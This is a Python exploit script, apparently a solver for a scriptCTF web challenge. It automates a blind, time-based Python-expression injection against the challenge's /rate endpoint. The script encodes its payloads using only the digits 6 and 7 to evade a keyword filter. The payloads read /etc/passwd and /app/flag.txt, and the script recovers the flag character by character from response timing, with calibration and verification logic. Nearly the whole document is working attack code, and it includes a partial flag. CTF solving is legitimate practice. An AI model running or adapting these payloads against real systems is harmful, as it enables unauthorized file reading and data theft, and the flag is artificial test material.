#!/usr/bin/env python3
import time
import statistics
import requests

TARGET = "http://a0daee04-c62f-4a21-9eee-1961ad3d06e9.challs.scriptsorcerers.xyz"

FLAG_PATH = "/app/flag.txt"
REF_PATH = "/etc/passwd"

# Prefix aman terakhir.
# Jangan pakai e3 dulu, karena idx 24 masih perlu dicek ulang.
RESUME = "scriptCTF{r3v3ng3_1337_e3ab5550ad9"

# Charset default kalau sudah lewat targeted index.
CHARSET = (
    "3a_b5"
    "abcdefghijklmnopqrstuvwxyz"
    "0123456789"
    "_}"
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    "-!@$"
)

# Charset khusus supaya idx awal setelah resume tidak boros instance.
TARGETED = {
    34: "0123456789abcdef_}",
    35: "0123456789abcdef_}",
    36: "0123456789abcdef_}",
}


TIMEOUT = 12

MAX_BASELINE = 3.0
HEAVY_DELTA = 0.85

# Scan awal per kandidat.
SCAN_MIN_CLEAN = 3

# Verify hanya kalau hasil scan belum jelas.
TOP_K = 5
VERIFY_MIN_CLEAN = 6

HEAVY_BASE = "77"
HEAVY_INNER = "7"

COOLDOWN_HEAVY = 4
COOLDOWN_NOISY = 3
COOLDOWN_RETRY = 4


def plus67(n: int) -> str:
    best = None

    for a in range(0, 180):
        for b in range(0, 180):
            if 6 * a + 7 * b == n:
                terms = ["7"] * b + ["6"] * a
                expr = "+".join(terms)

                if best is None or len(expr) < len(best):
                    best = expr

    if best is None:
        raise ValueError(f"cannot encode {n}")

    return best


def bytes_expr(s: str) -> str:
    return "bytes(" + "+".join(f"[{plus67(ord(c))}]" for c in s) + ")"


def num_expr(n: int) -> str:
    if n == 0:
        return "(6-6)"

    digs = []
    x = n

    while x:
        digs.append(x % 7)
        x //= 7

    digs = digs[::-1]

    def small(d: int) -> str:
        if d == 0:
            return "(6-6)"
        if d == 6:
            return "6"
        return "+".join(["(7-6)"] * d)

    expr = small(digs[0])

    for d in digs[1:]:
        expr = f"({expr})*7"
        if d:
            expr = f"{expr}+{small(d)}"

    return expr


def ref_char(idx: int) -> str:
    return f"next(open({bytes_expr(REF_PATH)}))[{num_expr(idx)}]"


def mode_rb_expr() -> str:
    # /etc/passwd first line biasanya:
    # root:x:0:0:root:/root:/bin/bash
    # index 0  = r
    # index 23 = b
    return ref_char(0) + "+" + ref_char(23)


def flag_byte_expr(idx: int) -> str:
    return f"next(open(*[{bytes_expr(FLAG_PATH)}]+[{mode_rb_expr()}]))[{num_expr(idx)}]"


def check_payload(payload: str):
    bad = [
        ".", "_", "import", "=", ",", "'", '"', "attr", "global", "local",
        ";", ":", "^", "/", ">", "<", "{", "}", "m", "a", "not", "and",
        "or", "eval", "exec", "for", "in", "chr", "ord", "hex", "int",
        "repr", "str", "dir", "set", "len", "sentences", "random",
        "request", "app", "flask",
    ]

    low = payload.lower()

    if len(set(low)) > 18:
        raise ValueError(
            f"unique >18: {len(set(low))} {sorted(set(low))}\n{payload}"
        )

    for x in bad:
        if x in low:
            raise ValueError(f"blocked token {x!r}\n{payload}")


def req_time(payload: str) -> float:
    check_payload(payload)

    t0 = time.perf_counter()

    try:
        requests.get(
            TARGET + "/rate",
            params={"wpm": payload},
            timeout=TIMEOUT,
        )
    except requests.exceptions.ReadTimeout:
        return TIMEOUT
    except Exception:
        pass

    return time.perf_counter() - t0


def make_payload(idx: int, ch):
    fb = flag_byte_expr(idx)

    # ch=None = false control byte 0
    guess = "(6-6)" if ch is None else num_expr(ord(ch))

    diff = f"(({fb})-({guess}))"
    cond = f"(6-6)**(({diff})*({diff}))"

    payload = f"{HEAVY_BASE}**(7**(({HEAVY_INNER})*({cond})))"

    check_payload(payload)

    return payload


def calibrate():
    print("=" * 80)
    print("[+] calibrating /app/flag.txt")

    control = make_payload(0, None)
    true_s = make_payload(0, "s")

    raw = []
    attempts = 0

    while len(raw) < 3 and attempts < 30:
        attempts += 1

        base = req_time(control)

        if base > MAX_BASELINE:
            print(f"    noisy control base={base:.3f}, cooldown")
            time.sleep(COOLDOWN_NOISY)
            continue

        value = req_time(true_s)
        raw.append((base, value))

        if value - base > HEAVY_DELTA:
            time.sleep(COOLDOWN_HEAVY)
        else:
            time.sleep(0.4)

    deltas = [v - b for b, v in raw]
    heavy = sum(d > HEAVY_DELTA for d in deltas)

    print(f"    raw true 's': {[(round(b, 3), round(v, 3)) for b, v in raw]}")
    print(f"    deltas: {[round(x, 3) for x in deltas]} heavy={heavy}/{len(deltas)}")

    if heavy >= 2:
        print("[+] calibration OK")
        return True

    print("[-] calibration failed")
    return False


def collect_candidate(idx: int, ch, min_clean: int):
    payload = make_payload(idx, ch)
    control = make_payload(idx, None)

    raw = []
    attempts = 0
    max_attempts = min_clean * 8

    while len(raw) < min_clean and attempts < max_attempts:
        attempts += 1

        base = req_time(control)

        if base > MAX_BASELINE:
            print(
                f"[{idx:02d}] {repr(ch)}: skip noisy base={base:.3f} "
                f"attempt={attempts}/{max_attempts}"
            )
            time.sleep(COOLDOWN_NOISY)
            continue

        value = req_time(payload)
        raw.append((base, value))

        if value - base > HEAVY_DELTA:
            time.sleep(COOLDOWN_HEAVY)
        else:
            time.sleep(0.3)

    if not raw:
        return {
            "ch": ch,
            "raw": raw,
            "deltas": [],
            "heavy": 0,
            "median": -999,
            "clean": 0,
        }

    deltas = [value - base for base, value in raw]
    heavy = sum(d > HEAVY_DELTA for d in deltas)
    median_delta = statistics.median(deltas)

    return {
        "ch": ch,
        "raw": raw,
        "deltas": deltas,
        "heavy": heavy,
        "median": median_delta,
        "clean": len(raw),
    }


def show_result(idx: int, result, label: str):
    raw = result["raw"]
    deltas = result["deltas"]

    print(
        f"[{idx:02d}] {repr(result['ch'])} {label}: "
        f"{[(round(b, 3), round(v, 3)) for b, v in raw]} "
        f"delta={result['median']:.3f} "
        f"heavy={result['heavy']}/{result['clean']} "
        f"deltas={[round(x, 3) for x in deltas]}"
    )


def score_key(result):
    return (
        result["heavy"],
        result["median"],
        result["clean"],
    )


def verify_top(idx: int, top_results):
    print("[+] verifying top candidates...")

    verified = []

    for old in top_results:
        ch = old["ch"]

        result = collect_candidate(
            idx,
            ch,
            min_clean=VERIFY_MIN_CLEAN,
        )

        show_result(idx, result, "VERIFY")
        verified.append(result)

        if result["heavy"] >= 2:
            time.sleep(COOLDOWN_RETRY)

    verified.sort(key=score_key, reverse=True)

    print("[+] verified ranking:")
    for result in verified:
        print(
            f"    {repr(result['ch'])}: "
            f"heavy={result['heavy']}/{result['clean']} "
            f"median={result['median']:.3f}"
        )

    best = verified[0]
    second = verified[1] if len(verified) > 1 else None

    if best["clean"] >= VERIFY_MIN_CLEAN and best["heavy"] >= 4 and best["median"] > HEAVY_DELTA:
        if second is None:
            return best["ch"]

        if best["heavy"] >= second["heavy"] + 2:
            return best["ch"]

        if best["heavy"] > second["heavy"] and best["median"] > second["median"] + 0.20:
            return best["ch"]

        print("[!] top terlalu dekat, belum aman")
        return None

    print("[!] best belum cukup kuat")
    return None


def get_charset_for_idx(idx: int):
    base_charset = TARGETED.get(idx, CHARSET)

    seen = set()
    return "".join(ch for ch in base_charset if not (ch in seen or seen.add(ch)))


def recover_position(idx: int):
    print("=" * 80)
    print(f"[+] recovering idx {idx}")

    charset = get_charset_for_idx(idx)

    scan_results = []

    for ch in charset:
        result = collect_candidate(
            idx,
            ch,
            min_clean=SCAN_MIN_CLEAN,
        )

        show_result(idx, result, "SCAN")
        scan_results.append(result)

    scan_results.sort(key=score_key, reverse=True)

    print("[+] scan top:")
    for result in scan_results[:10]:
        print(
            f"    {repr(result['ch'])}: "
            f"heavy={result['heavy']}/{result['clean']} "
            f"median={result['median']:.3f}"
        )

    best = scan_results[0]
    second = scan_results[1]

    # Fast accept kalau scan jelas.
    if (
        best["heavy"] >= 3
        and best["median"] > HEAVY_DELTA
        and second["heavy"] <= 1
    ):
        print(
            f"[+] fast accept idx {idx}: {best['ch']!r} "
            f"heavy={best['heavy']}/{best['clean']} "
            f"median={best['median']:.3f}"
        )
        return best["ch"]

    top = scan_results[:TOP_K]
    return verify_top(idx, top)


def recover():
    print("[+] TARGET:", TARGET)
    print("[+] RESUME:", RESUME)
    print("[+] start from idx:", len(RESUME))

    if not calibrate():
        print("[-] Oracle belum stabil.")
        print("[-] Coba spawn fresh instance, lalu ganti TARGET.")
        return

    flag = RESUME

    for idx in range(len(flag), 100):
        ch = recover_position(idx)

        if ch is None:
            print("[-] no confident char at idx", idx)
            print("[+] partial:", flag)
            print("[!] Run ulang dari RESUME yang sama.")
            print("[!] Kalau scan top jelas, boleh append manual lalu lanjut.")
            return

        flag += ch
        print("[+] current =", flag)

        if ch == "}":
            print("[+] FINAL:", flag)
            return

    print("[+] partial:", flag)


if __name__ == "__main__":
    recover()
